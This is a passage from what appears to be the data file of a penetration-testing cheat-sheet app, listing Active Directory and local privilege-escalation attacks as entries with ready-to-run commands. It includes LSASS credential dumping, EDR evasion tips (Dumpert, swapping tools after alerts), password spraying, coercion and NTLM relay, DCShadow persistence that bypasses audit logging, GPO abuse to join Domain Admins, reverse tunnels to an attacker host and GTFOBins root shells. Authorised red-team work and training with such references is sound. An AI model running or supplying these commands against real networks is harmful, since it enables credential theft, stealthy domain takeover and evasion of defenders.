    description: "Cross-references logged-on-user data across every domain computer against a target user/group (default: Domain Admins) to find exactly which host they're currently sitting on.",
    useCase: "Locating a Domain Admin's active session as a target for token impersonation, Cross-Session Activation (RemotePotato0), or a coercion-based attack against that specific host.",
  },
  {
    id: "invoke-sessionhunter",
    tool: "Invoke-SessionHunter",
    phase: "recon",
    title: "List sessions on remote machines without WinRM/PSRemoting",
    command: "Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access",
    description: "Queries logged-on-user info via the registry remotely (not WinRM/WMI), then separately checks local-admin access — lighter footprint than Find-DomainUserLocation on networks where WinRM is disabled.",
    useCase: "Session hunting fallback when the environment blocks the remoting protocols PowerView's session-hunting functions rely on.",
  },
  {
    id: "powerhuntshares",
    tool: "PowerHuntShares",
    phase: "recon",
    title: "Inventory and risk-rate every SMB share in the domain",
    command: "Invoke-HuntSMBShares -NoPing -OutputDirectory C:\\Temp -HostList servers.txt",
    description: "Enumerates SMB shares across a host list, then flags ones with excessive/interesting permissions (Everyone-writable, sensitive filenames) in an HTML report — far more thorough than a one-off Invoke-ShareFinder sweep.",
    useCase: "Finding a writable share that leads to code execution (e.g. a share backing a scheduled task or logon script) across an entire domain in one pass.",
  },
  {
    id: "group3r",
    tool: "Group3r",
    phase: "recon",
    title: "Audit GPO permissions and settings",
    command: "group3r.exe -s -o group3r_out.txt",
    description: "Enumerates every GPO in the domain and flags dangerous settings and delegated permissions.",
    useCase: "Finding GPO-based privesc/persistence opportunities without manually opening every policy in GPMC.",
  },
  {
    id: "snaffler",
    tool: "Snaffler",
    phase: "recon",
    title: "Hunt for credentials and sensitive files across shares",
    command: "Snaffler.exe -d $DOMAIN -s -o snaffler_out.log",
    description: "Crawls every reachable share in the domain looking for config files, scripts, and documents likely to contain credentials.",
    useCase: "Automating smbmap/smbclient-style share hunting at domain scale instead of host by host.",
  },
  {
    id: "ldapdomaindump",
    tool: "LDAPDomainDump",
    phase: "recon",
    title: "Dump LDAP data to browsable HTML/JSON",
    command: "ldapdomaindump -u '$DOMAIN\\$USER' -p $PASS $DC",
    description: "Pulls users, groups, computers, policies and trusts over LDAP and renders them as browsable HTML pages plus raw JSON/CSV.",
    useCase: "A quick visual reference of domain data to hand off or review without needing a live connection.",
  },
  {
    id: "nltest-trusts",
    tool: "nltest",
    phase: "recon",
    title: "Enumerate domain trusts",
    command: "nltest /domain_trusts /all_trusts",
    description: "Native Windows command listing every trust relationship the current domain has, including direction and trust type.",
    useCase: "Fast built-in trust enumeration when you have a Windows shell but no other tooling staged.",
  },
  {
    id: "adidnsdump",
    tool: "adidnsdump",
    phase: "recon",
    title: "Dump AD-integrated DNS records",
    command: "adidnsdump -u $DOMAIN\\$USER -p $PASS $DC",
    description: "Pulls every record from AD-integrated DNS zones, revealing internal hostnames that might not appear in AD computer objects.",
    useCase: "Discovering internal infrastructure and naming conventions beyond what BloodHound/LDAP alone shows.",
  },
  {
    id: "laps-toolkit",
    tool: "LAPSToolkit",
    phase: "recon",
    title: "Find who can read LAPS passwords",
    command: "Find-LAPSDelegatedGroups; Get-LAPSComputers",
    description: "Maps which groups are delegated LAPS read rights, and lists every LAPS-managed computer plus its current password if you're authorized to read it.",
    useCase: "Faster than walking ReadLAPSPassword edges in BloodHound one at a time.",
  },
  {
    id: "impacket-finddelegation",
    tool: "Impacket (findDelegation.py)",
    phase: "recon",
    title: "Find all delegation configurations",
    command: "findDelegation.py $DOMAIN/$USER:$PASS",
    description: "Lists every account configured for unconstrained, constrained, or resource-based constrained delegation in one pass.",
    useCase: "Fast way to find delegation abuse targets without manually querying each account's attributes.",
  },
  {
    id: "impacket-getadcomputers",
    tool: "Impacket (GetADComputers.py)",
    phase: "recon",
    title: "Dump all domain computer objects",
    command: "GetADComputers.py $DOMAIN/$USER:$PASS -dc-ip $DC",
    description: "Lists every computer object in the domain with OS version and last logon.",
    useCase: "Building a target list and spotting outdated, unpatched, or decommissioned-looking hosts.",
  },

  // ============ ADDITIONAL KERBEROS / TICKET HANDLING ============
  {
    id: "klist",
    tool: "klist",
    phase: "cred",
    title: "List cached Kerberos tickets",
    command: "klist",
    description: "Shows every Kerberos ticket currently cached in the logon session — TGT and any TGS already requested.",
    useCase: "Checking what tickets are already available (e.g. after Rubeus /ptt) before running further Kerberos attacks.",
  },
  {
    id: "impacket-gettgt",
    tool: "Impacket (GetTGT.py)",
    phase: "cred",
    title: "Request and save a TGT to a ccache file",
    command: "GetTGT.py $DOMAIN/$USER:$PASS -dc-ip $DC",
    description: "Requests a TGT and saves it as a .ccache file for use with other Impacket tools via the KRB5CCNAME environment variable.",
    useCase: "Setting up Kerberos auth for tools that need a cached ticket rather than a password on every call.",
  },
  {
    id: "impacket-gettgt-hashes",
    tool: "Impacket (GetTGT.py)",
    phase: "cred",
    title: "Request a TGT with an NT hash (overpass-the-hash)",
    command: "GetTGT.py -hashes :$HASH $DOMAIN/$USER@$TARGET",
    description: "Same TGT request as GetTGT.py, but authenticates with an NT hash instead of a cleartext password — the LM half can be left empty since only the NT hash matters for the exchange.",
    useCase: "Converting an NTLM hash into a fully usable Kerberos TGT (.ccache) without ever needing the plaintext password.",
  },
  {
    id: "impacket-gettgt-aeskey",
    tool: "Impacket (GetTGT.py)",
    phase: "cred",
    title: "Request a TGT with an AES key (pass-the-key)",
    command: "GetTGT.py -aesKey $HASH $DOMAIN/$USER@$TARGET",
    description: "Requests a TGT using an AES128/256 Kerberos key instead of a password or NT hash — useful when only the AES key was recovered (e.g. from DPAPI/DSInternals output), since NTLM-based auth won't accept it.",
    useCase: "Authenticating in AES-only environments (NTLM restricted/disabled) where an NT hash alone wouldn't be accepted.",
  },
  {
    id: "impacket-getst",
    tool: "Impacket (getST.py)",
    phase: "lateral",
    title: "Request a service ticket (S4U2Self/S4U2Proxy)",
    command: "getST.py -spn cifs/$TARGET -impersonate administrator $DOMAIN/$USER:$PASS",
    description: "Requests a TGS for a specific SPN, optionally impersonating another user via S4U — the core mechanic behind RBCD and constrained delegation abuse.",
    useCase: "The follow-up step after configuring RBCD, or when a target already trusts you for constrained delegation.",
  },
  {
    id: "impacket-ticketconverter",
    tool: "Impacket (ticketConverter.py)",
    phase: "cred",
    title: "Convert between .kirbi and .ccache ticket formats",
    command: "ticketConverter.py ticket.kirbi ticket.ccache",
    description: "Converts Windows-style Mimikatz/Rubeus .kirbi tickets to Linux-style .ccache and back.",
    useCase: "Moving a ticket forged or dumped on Windows over to Impacket tooling on Linux, or vice versa.",
  },
  {
    id: "pkinit-gettgt",
    tool: "PKINITtools (gettgtpkinit.py)",
    phase: "cred",
    title: "Request a TGT using a certificate (PKINIT)",
    command: "gettgtpkinit.py -cert-pfx $OUTFILE.pfx $DOMAIN/$TARGETOBJECT $OUTFILE.ccache",
    description: "Authenticates via PKINIT using a certificate instead of a password, and can recover the account's NT hash from the PKINIT response.",
    useCase: "The Linux-side equivalent of certipy auth — useful when the certificate came from a source other than Certipy.",
  },
  {
    id: "pkinit-gettgt-pem",
    tool: "PKINITtools (gettgtpkinit.py)",
    phase: "cred",
    title: "Request a TGT from a PEM cert + key pair",
    command: "gettgtpkinit.py -cert-pem $OUTFILE.pem -key-pem $OUTFILE.key $DOMAIN/$TARGETOBJECT $OUTFILE.ccache",
    description: "Same PKINIT TGT request as the PFX variant, but for certificates already split into separate PEM certificate and private key files instead of a single PFX bundle.",
    useCase: "Handling certificates exported or issued in PEM form (e.g. from non-Windows CAs or OpenSSL workflows) rather than Certipy's default PFX output.",
  },
  {
    id: "pkinit-getnthash",
    tool: "PKINITtools (getnthash.py)",
    phase: "cred",
    title: "UnPAC-the-hash — recover NT hash from a PKINIT TGT",
    command: "getnthash.py -key $HASH $DOMAIN/$TARGETOBJECT",
    description: "Uses the PKINIT protocol extension that returns session-key material tied to the account's NT hash, recovering the actual NT hash straight from a certificate-based TGT request — no NTLM authentication ever takes place.",
    useCase: "Turning a certificate (e.g. from ESC1/ESC8 or Shadow Credentials) directly into an NT hash usable everywhere else, without needing a separate DCSync.",
  },
  {
    id: "pkinit-gets4uticket",
    tool: "PKINITtools (gets4uticket.py)",
    phase: "lateral",
    title: "S4U2Self a service ticket from a PKINIT TGT",
    command: "gets4uticket.py kerberos+ccache://$DOMAIN\\\\$TARGETOBJECT:$OUTFILE.ccache@$DC cifs/$TARGET $OUTFILE.ccache",
    description: "Uses an already-obtained PKINIT TGT to request a service ticket for a specific SPN via S4U2Self, without needing the account's NT hash at all.",
    useCase: "Getting usable access to a specific service straight from a certificate-derived TGT, skipping the UnPAC-the-hash step entirely when a hash isn't actually needed.",
  },
  {
    id: "certipy-unprotect-pfx",
    tool: "Certipy",
    phase: "cred",
    title: "Strip a password off a protected PFX",
    command: "certipy cert -pfx $OUTFILE.pfx -password $PASS -export -out unprotected.pfx",
    description: "Older Certipy versions can't consume a password-protected PFX directly for auth — this re-exports it password-free first so certipy auth can load it.",
    useCase: "Working around older Certipy builds when a certificate came out of Certipy find/req with a set PFX password.",
  },
  {
    id: "certipy-split-pfx",
    tool: "Certipy",
    phase: "cred",
    title: "Split a PFX into separate cert and key files",
    command: "certipy cert -pfx $OUTFILE.pfx -nokey -out user.crt",
    description: "Extracts just the certificate (or, with -nocert instead, just the private key) from a PFX bundle — the format PassTheCert and several other cert-auth tools expect instead of a single PFX file.",
    useCase: "Feeding a Certipy-obtained certificate into tooling (like PassTheCert) that wants a separate cert/key pair rather than a PFX bundle.",
  },
  {
    id: "passthecert-elevate-dcsync",
    tool: "PassTheCert",
    phase: "privesc",
    title: "Authenticate with a certificate and grant DCSync",
    command: "passthecert.py -action modify_user -crt user.crt -key user.key -domain $DOMAIN -dc-ip $DC -target $TARGETOBJECT -elevate",
    description: "Binds to LDAP using Schannel (certificate) authentication instead of NTLM/Kerberos, then directly grants the target account DCSync rights (DS-Replication-Get-Changes / -All) over the domain object.",
    useCase: "Converting any usable client certificate straight into DCSync rights — LDAPS/Schannel auth is frequently overlooked by monitoring focused on NTLM/Kerberos.",
  },
  {
    id: "nxc-pass-the-cert",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Authenticate with a certificate (Pass-the-Certificate)",
    command: "nxc ldap $TARGET --pfx-cert $OUTFILE.pfx --pfx-pass $PASS -u $USER",
    description: "Authenticates over LDAP/LDAPS using a PFX client certificate instead of a password or hash — nxc also accepts --pfx-base64 for an inline base64 PFX, or --pem-cert/--pem-key for a split PEM cert/key pair.",
    useCase: "Validating a stolen or requested certificate's access directly through NetExec, without switching to Certipy or a separate PKINIT tool.",
  },

  // ============ ADDITIONAL CREDENTIAL ACCESS ============
  {
    id: "pypykatz",
    tool: "pypykatz",
    phase: "cred",
    title: "Parse LSASS memory offline (Linux)",
    command: "pypykatz lsa minidump lsass.dmp",
    description: "Python reimplementation of Mimikatz's credential-parsing logic — reads an already-dumped LSASS minidump without needing Windows or Mimikatz itself.",
    useCase: "Parsing a procdump/comsvcs LSASS dump on your Linux attack box instead of running Mimikatz on the target.",
  },
  {
    id: "safetykatz",
    tool: "SafetyKatz",
    phase: "cred",
    title: "Dump LSASS credentials via minidump + embedded Mimikatz",
    command: "SafetyKatz.exe \"sekurlsa::ekeys\"",
    description: "Combines a minidump of LSASS with an embedded, patched Mimikatz to parse it in-process — avoids writing a full Mimikatz binary to disk and dodges some signature-based detection that flags mimikatz.exe by name/hash.",
    useCase: "Same credential yield as Mimikatz's sekurlsa module, on an endpoint where mimikatz.exe itself gets flagged immediately.",
  },
  {
    id: "sharpkatz",
    tool: "SharpKatz",
    phase: "cred",
    title: "C# reimplementation of Mimikatz's LSASS parsing",
    command: "SharpKatz.exe --Command ekeys",
    description: "A from-scratch C# port of specific Mimikatz modules rather than a wrapper around the original — different code signature than SafetyKatz/Mimikatz, worth having as a third option when the first two both get caught.",
    useCase: "Rotating to a differently-signatured tool after an EDR alert on Mimikatz/SafetyKatz, without changing the underlying technique.",
  },
  {
    id: "dumpert",
    tool: "Dumpert",
    phase: "evasion",
    title: "Dump LSASS via direct syscalls (API-unhooking evasion)",
    command: "rundll32.exe C:\\Dumpert\\Outflank-Dumpert.dll,Dump",
    description: "Calls NTAPI functions directly via raw syscalls instead of going through the usual (and commonly EDR-hooked) ntdll/kernel32 exports — produces a standard LSASS minidump file that pypykatz/Mimikatz can then parse offline.",
    useCase: "Dumping LSASS on an endpoint with EDR userland hooks in place, where MiniDumpWriteDump-based tools (SafetyKatz, comsvcs.dll) get caught or blocked.",
  },
  {
    id: "lazagne",
    tool: "LaZagne",
    phase: "cred",
    title: "Recover credentials stored by installed applications",
    command: "laZagne.exe all",
    description: "Scans for credentials saved by browsers, mail clients, WiFi profiles, and many other common applications.",
    useCase: "Harvesting additional credentials on a foothold beyond what LSASS/SAM alone would reveal.",
  },
  {
    id: "comsvcs-lsass-dump",
    tool: "comsvcs.dll (LOLBin)",
    phase: "cred",
    title: "Dump LSASS using a built-in Windows DLL",
    command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full",
    description: "Uses a legitimate Windows DLL export to create an LSASS minidump without dropping any external tool — a living-off-the-land alternative to Mimikatz/ProcDump.",
    useCase: "Dumping LSASS on a monitored host where bringing in Mimikatz or ProcDump would trigger AV/EDR.",
  },
  {
    id: "dsinternals-replaccount",
    tool: "DSInternals",
    phase: "cred",
    title: "Extract hashes from an offline NTDS.dit",
    command: "Get-ADDBAccount -All -DBPath ntds.dit -BootKey $HASH",
    description: "PowerShell module for parsing an offline copy of NTDS.dit (e.g. from a VSS shadow copy) into readable account/hash data without needing DRSUAPI access.",
    useCase: "Extracting domain hashes from a stolen NTDS.dit file when live DCSync against a DC isn't an option.",
  },
  {
    id: "ntdsutil-ifm",
    tool: "ntdsutil",
    phase: "cred",
    title: "Create an IFM snapshot for offline NTDS extraction",
    command: "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ifm\" q q",
    description: "Native Windows utility that creates an Install-From-Media snapshot containing a full copy of NTDS.dit and the SYSTEM hive, usable with secretsdump.py against the files directly.",
    useCase: "Grabbing a full offline copy of the domain database from a DC without a live DCSync-style network operation.",
  },
  {
    id: "impacket-owneredit",
    tool: "Impacket (owneredit.py)",
    phase: "privesc",
    title: "Read or change an object's owner",
    command: "owneredit.py -action write -new-owner $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS",
    description: "Impacket's dedicated tool for reading and modifying the owner of an AD object — the WriteOwner abuse primitive.",
    useCase: "Alternative to bloodyAD's set owner, and pairs with dacledit.py for the full WriteOwner → WriteDacl chain.",
  },
  {
    id: "impacket-dacledit",
    tool: "Impacket (dacledit.py)",
    phase: "privesc",
    title: "Grant yourself rights by writing the DACL directly",
    command: "dacledit.py -action write -rights FullControl -principal $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS",
    description: "Reads or writes an object's DACL directly — the tool behind WriteDacl/Owns abuse in the Attack Paths tab.",
    useCase: "Granting yourself GenericAll on an object once you hold WriteDacl or ownership over it.",
  },
  {
    id: "dacledit-check-altsecid-rights",
    tool: "Impacket (dacledit.py)",
    phase: "recon",
    title: "Check who can write a target's altSecurityIdentities",
    command: "dacledit.py -action read -principal $USER -target $TARGETOBJECT $DOMAIN/$USER:$PASS",
    description: "Reads a target object's DACL to check for the specific rights that let you plant an ESC14 explicit certificate mapping: Write-Property on altSecurityIdentities itself, Write-Property on Public-Information, Write-Property (all), WriteDacl, WriteOwner, GenericWrite/GenericAll, or ownership.",
    useCase: "Confirming ESC14 write access to a specific target before spending time enrolling a certificate and building the mapping string.",
  },
  {
    id: "getweakexplicitmappings",
    tool: "GetWeakExplicitMappings.py",
    phase: "recon",
    title: "Enumerate weak explicit certificate mappings domain-wide",
    command: "python3 GetWeakExplicitMappings.py -dc-host $DC -u $USER -p $PASS -domain $DOMAIN",
    description: "Scans every account's altSecurityIdentities attribute domain-wide for mapping types considered weak (X509RFC822, X509IssuerSubject, X509SubjectOnly, or a non-unique Issuer-only mapping) — the accounts this turns up are ESC14-B/C/D targets, exploitable by matching their existing weak mapping rather than needing write access to plant a new one.",
    useCase: "Finding pre-existing weak mappings across the whole domain instead of checking one target's DACL at a time.",
  },
  {
    id: "impacket-changepasswd",
    tool: "Impacket (changepasswd.py)",
    phase: "cred",
    title: "Change a password using the old one (or a granted right)",
    command: "changepasswd.py $DOMAIN/$USER:$PASS@$TARGET -newpass 'NewPassw0rd!'",
    description: "Changes a password over SAMR — can perform a self-service change, or a forced reset if you hold that right over another account.",
    useCase: "Alternative to bloodyAD's set password when working from an Impacket-only toolkit.",
  },
  {
    id: "impacket-addcomputer",
    tool: "Impacket (addcomputer.py)",
    phase: "privesc",
    title: "Add a computer account (machine quota)",
    command: "addcomputer.py -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd!' $DOMAIN/$USER:$PASS",
    description: "Creates a new computer object using the default MachineAccountQuota, same purpose as bloodyAD's add computer.",
    useCase: "Getting a machine account under your control for RBCD abuse when bloodyAD isn't staged.",
  },
  {
    id: "domainpasswordspray",
    tool: "DomainPasswordSpray",
    phase: "cred",
    title: "Spray a single password across all domain users",
    command: "Invoke-DomainPasswordSpray -Password 'Summer2026!' -OutFile sprayed.txt",
    description: "Pulls the domain user list automatically and sprays one password against all of them, respecting the account lockout policy.",
    useCase: "Windows-native alternative to nxc spraying when operating from a domain-joined PowerShell session.",
  },
  {
    id: "smartbrute-brute",
    tool: "smartbrute",
    phase: "cred",
    title: "Bruteforce Kerberos pre-auth (brute mode)",
    command: "smartbrute.py brute -bU users.txt -bP passwords.txt kerberos -d $DOMAIN",
    description: "Standard bruteforce mode — tries every user/password combination from the supplied lists against Kerberos pre-authentication, reading AS-REQ error codes to tell valid creds from invalid ones without a full authentication attempt.",
    useCase: "Straightforward username+password list bruteforce when you have no existing credentials to seed smarter enumeration.",
  },
  {
    id: "smartbrute-smart",
    tool: "smartbrute",
    phase: "cred",
    title: "Lockout-aware password spray (smart mode)",
    command: "smartbrute.py smart -bP passwords.txt ntlm -d $DOMAIN -u $USER -p $PASS kerberos",
    description: "Smart mode uses one already-valid low-priv credential to enumerate the real user list and password/lockout policy over LDAP first, then sprays only against accounts that won't trip a lockout — instead of blindly bruteforcing.",
    useCase: "Safer, quieter password spraying once you already hold one valid credential to enumerate with.",
  },
  {
    id: "get-lapsadpassword",
    tool: "Get-LapsADPassword",
    phase: "cred",
    title: "Retrieve a Windows LAPS password (native cmdlet)",
    command: "Get-LapsADPassword $TARGETOBJECT -AsPlainText",
    description: "Built-in PowerShell cmdlet (modern Windows LAPS) for reading the current managed local admin password, if your account is authorized.",
    useCase: "Native alternative to LAPSToolkit/bloodyAD when the LAPS PowerShell module is already present.",
  },
  {
    id: "mimikatz-dcshadow",
    tool: "Mimikatz",
    phase: "persist",
    title: "DCShadow — inject a change as a rogue DC",
    command: "lsadump::dcshadow /object:$TARGETOBJECT /attribute:primaryGroupID /value:512",
    description: "Temporarily registers the attacker's machine as a domain controller and pushes a directory change via replication, bypassing the audit logging normally generated for that change.",
    useCase: "Extremely stealthy persistence/privesc — e.g. silently adding a user to Domain Admins without the usual group-membership-change events.",
  },

  // ============ ADDITIONAL COERCION / RELAY ============
  {
    id: "coercer",
    tool: "Coercer",
    phase: "privesc",
    title: "Test multiple coercion methods against a target",
    command: "coercer coerce -l $ATTACKER -t $DC -u $USER -p $PASS -d $DOMAIN",
    description: "Automates testing a target for every known authentication-coercion method (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, and more) in one run.",
    useCase: "Finding which coercion technique actually works against a hardened target instead of trying each tool one by one.",
  },
  {
    id: "dfscoerce",
    tool: "DFSCoerce",
    phase: "privesc",
    title: "Coerce authentication via MS-DFSNM",
    command: "python3 dfscoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $DC",
    description: "Forces a target to authenticate via the Distributed File System Namespace protocol — an alternative coercion primitive to PetitPotam/PrinterBug.",
    useCase: "Coercion fallback when EFSRPC and the print spooler are both patched or disabled.",
  },
  {
    id: "gpoddity-coerce-relay",
    tool: "GPOddity",
    phase: "privesc",
    title: "Coerce and relay via GPO SYSVOL script abuse",
    command: "gpoddity.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC --relay-to ldap://$DC",
    description: "Plants a coercion primitive inside a GPO-linked SYSVOL script/shortcut so any machine that later applies that GPO authenticates back to the attacker — a GPO-based coercion source instead of relying on a specific coercible RPC service (PetitPotam/PrinterBug/DFSCoerce) being reachable.",
    useCase: "Coercing authentication from every machine that processes a given GPO — useful when the usual RPC-based coercion primitives are all patched, firewalled, or otherwise unreachable.",
  },
  {
    id: "mitm6",
    tool: "mitm6",
    phase: "cred",
    title: "IPv6 DNS takeover for relay",
    command: "sudo mitm6 -d $DOMAIN -i $INTERFACE",
    description: "Answers DHCPv6 requests to become the network's default IPv6 DNS server, then abuses Windows' IPv6-preferred behavior to intercept traffic even on IPv4-only networks. Needs root for the raw DHCPv6/ND socket on the chosen interface.",
    useCase: "Opening up NTLM relay opportunities on networks where LLMNR/NBT-NS poisoning alone isn't landing hits.",
  },

  // ============ ADDITIONAL AD CS (Windows-side) ============
  {
    id: "certify-find",
    tool: "Certify",
    phase: "cred",
    title: "Enumerate ADCS misconfigurations (Windows)",
    command: "Certify.exe find /vulnerable",
    description: "Windows/.NET equivalent of certipy find — audits certificate templates for the same ESC1-style misconfigurations.",
    useCase: "ADCS enumeration from a Windows box when staging Python/Certipy isn't convenient.",
  },
  {
    id: "whisker-shadow",
    tool: "Whisker",
    phase: "cred",
    title: "Shadow Credentials attack (Windows)",
    command: "Whisker.exe add /target:$TARGETOBJECT",
    description: "Windows/.NET equivalent of certipy shadow / bloodyAD shadowCredentials — writes a key credential and prints the corresponding PKINIT command.",
    useCase: "Running the Shadow Credentials attack from a Windows foothold without Python tooling staged.",
  },

  // ============ ADDITIONAL GPO ============
  {
    id: "sharpgpoabuse-standalone",
    tool: "SharpGPOAbuse",
    phase: "privesc",
    title: "Abuse a writable GPO for local admin",
    command: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author $DOMAIN\\$USER --Command cmd.exe --Arguments '/c net localgroup administrators $USER /add' --GPOName 'VulnGPO'",
    description: "Adds a malicious scheduled task to a GPO you control, executed on every computer the GPO applies to at the next policy refresh.",
    useCase: "Turning GPO write access into local admin on every machine in that GPO's scope.",
  },
  {
    id: "pygpoabuse-immediate-task",
    tool: "pyGPOabuse",
    phase: "privesc",
    title: "Add an immediate scheduled task to an existing GPO (Linux)",
    command: "pygpoabuse '$DOMAIN/$USER:$PASS' -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\"",
    description: "Linux/Python equivalent of SharpGPOAbuse's immediate-task technique — updates an existing GPO you control to add a scheduled task that runs at the next policy refresh and removes itself afterward.",
    useCase: "Same GPO-write-to-code-execution primitive as SharpGPOAbuse, from a Linux attack host with no .NET binary needed.",
  },
  {
    id: "gpowned-immediate-task",
    tool: "GPOwned",
    phase: "privesc",
    title: "Create a new immediate scheduled task via a GPO (Linux)",
    command: "GPOwned -u $USER -p $PASS -d $DOMAIN -dc-ip $DC -gpoimmtask -name \"12345677-ABCD-9876-ABCD-123456789012\" -author $DOMAIN\\\\Administrator -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\\windows\\system32\\calc.exe'",
    description: "Creates a brand-new GPO-linked immediate scheduled task from Linux rather than modifying an existing one — the author notes this tool is buggy and not meant for production use, so pyGPOabuse is the steadier choice when one is already available.",
    useCase: "A fallback GPO-abuse option when pyGPOabuse isn't staged, with the caveat that it's explicitly flagged upstream as unreliable.",
  },
  {
    id: "invoke-gpowned-multitasking",
    tool: "Invoke-GPOwned",
    phase: "privesc",
    title: "Multitasking attack — escalate to Domain Admin via a GPO'd session",
    command: "Invoke-GPOwned -GPOName \"Target_GPO_Name\" -LoadDLL '.\\Microsoft.ActiveDirectory.Management.dll' -User Attacker -DA -ScheduledTasksXMLPath '.\\ScheduledTasks.xml' -SecondTaskXMLPath '.\\wsadd.xml' -Author DA_User -SecondXMLCMD \"/r net group 'Domain Admins' Attacker /add /domain\"",
    description: "A two-stage scheduled-task chain for when a Domain Admin session already exists on a non-DC workstation/server that applies a GPO you control: the first task runs as SYSTEM and drops a batch file onto SYSVOL, which registers a second task set to run with the highest available privileges — landing in the actual Domain Admin's logon context and adding the attacker straight into Domain Admins.",
    useCase: "Escalating from ordinary GPO write access to full Domain Admin group membership, specifically by riding an existing privileged session on a machine rather than needing that machine's own local admin rights.",
  },
  {
    id: "gpp-decrypt",
    tool: "gpp-decrypt",
    phase: "cred",
    title: "Decrypt legacy GPP passwords",
    command: "gpp-decrypt $HASH",
    description: "Decrypts the cpassword field found in old Group Policy Preferences XML files — Microsoft's published AES key makes this trivial.",
    useCase: "Cracking a leftover legacy GPP-deployed local admin password found while browsing SYSVOL.",
  },

  // ============ ADDITIONAL PIVOTING ============
  {
    id: "chisel",
    tool: "Chisel",
    phase: "pivot",
    title: "HTTP-based tunnel (Ligolo-ng alternative)",
    command: "./chisel server -p 8080 --reverse\n./chisel client $ATTACKER:8080 R:socks",
    description: "Fast TCP/UDP tunnel over HTTP — often gets through restrictive egress filtering that blocks other pivot methods since it looks like ordinary web traffic.",
    useCase: "Pivoting option when Ligolo-ng's custom protocol gets blocked but outbound HTTP doesn't.",
  },

  // ============ GTFOBINS — LINUX LOCAL PRIVESC ============
  {
    id: "gtfobins-suid-scan",
    tool: "GTFOBins recon",
    phase: "privesc",
    title: "Find SUID/SGID binaries",
    command: "find / -perm -4000 -type f 2>/dev/null",
    description: "Lists every binary with the SUID bit set — these run with the file owner's (often root) privileges regardless of who executes them.",
    useCase: "First step in local privesc — cross-reference results against GTFOBins' SUID column for an exploitable binary.",
  },
  {
    id: "gtfobins-sudo-l",
    tool: "GTFOBins recon",
    phase: "privesc",
    title: "Check sudo privileges",
    command: "sudo -l",
    description: "Lists every command the current user is allowed to run via sudo, with or without a password.",
    useCase: "The other half of local privesc discovery — cross-reference each allowed command against GTFOBins' sudo column.",
  },
  {
    id: "gtfobins-find",
    tool: "GTFOBins: find",
    phase: "privesc",
    title: "Escape to a shell via find",
    command: "sudo find . -exec /bin/sh \\; -quit",
    description: "find's -exec flag runs an arbitrary command; combined with sudo or the SUID bit, that shell inherits the elevated privilege.",
    useCase: "Extremely common — find shows up in sudo -l output far more often than you'd expect.",
  },
  {
    id: "gtfobins-vim",
    tool: "GTFOBins: vim",
    phase: "privesc",
    title: "Escape to a shell via vim",
    command: "sudo vim -c ':!/bin/sh'",
    description: "vim can shell out to the OS via :! ; if it's SUID or sudo-permitted, that shell inherits the elevated privilege.",
    useCase: "Common on systems where vim/vi was granted sudo access for 'just editing config files.'",
  },
  {
    id: "gtfobins-less",
    tool: "GTFOBins: less",
    phase: "privesc",
    title: "Escape to a shell via less",
    command: "sudo less /etc/hosts",
    description: "less is a pager that supports shelling out — once open, type !/bin/sh at the prompt to spawn a shell with the pager's privileges.",
    useCase: "Pagers (less/more) are frequently sudo-permitted for viewing log files, making this a very common find.",
  },
  {
    id: "gtfobins-awk",
    tool: "GTFOBins: awk",
    phase: "privesc",
    title: "Escape to a shell via awk",
    command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    description: "awk's BEGIN block can call system() directly, running an arbitrary command with awk's privileges.",
    useCase: "A go-to when awk shows up in sudo -l — no interactive escape sequence needed, it's a one-liner.",
  },
  {
    id: "gtfobins-python",
    tool: "GTFOBins: python",
    phase: "privesc",
    title: "Escape to a shell via python",
    command: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    description: "Spawns a shell through Python's os.system() call, inheriting whatever privilege the python interpreter was run with.",
    useCase: "Reliable across almost any Linux box, since Python is nearly always installed.",
  },
  {
    id: "gtfobins-tar",
    tool: "GTFOBins: tar",
    phase: "privesc",
    title: "Escape to a shell via tar",
    command: "sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    description: "tar's checkpoint-action flag can be pointed at an arbitrary command, executed mid-archive-operation with tar's privileges.",
    useCase: "Less obvious than find/vim but shows up often enough in backup-related sudo rules to be worth checking.",
  },
  {
    id: "gtfobins-nmap-interactive",
    tool: "GTFOBins: nmap",
    phase: "privesc",
    title: "Escape to a shell via legacy nmap interactive mode",
    command: "sudo nmap --interactive",
    description: "Older nmap versions (pre-5.21) shipped an interactive mode that supports shelling out via !sh — patched out of modern releases, so check the version first.",
    useCase: "Worth trying on older/unpatched systems where nmap was granted sudo for network scanning.",
  },
  {
    id: "gtfobins-docker",
    tool: "GTFOBins: docker",
    phase: "privesc",
    title: "Escape via docker group membership",
    command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    description: "Membership in the docker group is effectively root — it lets you mount the host filesystem into a container and chroot into it.",
    useCase: "Check `groups` first; docker group membership is often granted without anyone realizing it's equivalent to root.",
  },

  // ============ WINDOWS LOCAL PRIVILEGE ESCALATION ============
  {
    id: "winpriv-whoami-priv",
    tool: "Windows PrivEsc recon",
    phase: "privesc",
    title: "Check current token privileges",
    command: "whoami /priv",
    description: "Lists privileges held by the current token. SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege, and SeTakeOwnershipPrivilege are all directly exploitable when enabled.",
    useCase: "First check on any Windows foothold before looking for anything more elaborate.",
  },
  {
    id: "winpriv-printspoofer",
    tool: "Windows PrivEsc: PrintSpoofer",
    phase: "privesc",
    title: "SYSTEM via SeImpersonatePrivilege",
    command: "PrintSpoofer.exe -i -c cmd",
    description: "Abuses SeImpersonatePrivilege via a fake named pipe and the print spooler service to impersonate SYSTEM.",
    useCase: "Default local privesc technique for service accounts (IIS, MSSQL, etc.) — they almost always hold SeImpersonatePrivilege.",
  },
  {
    id: "winpriv-godpotato",
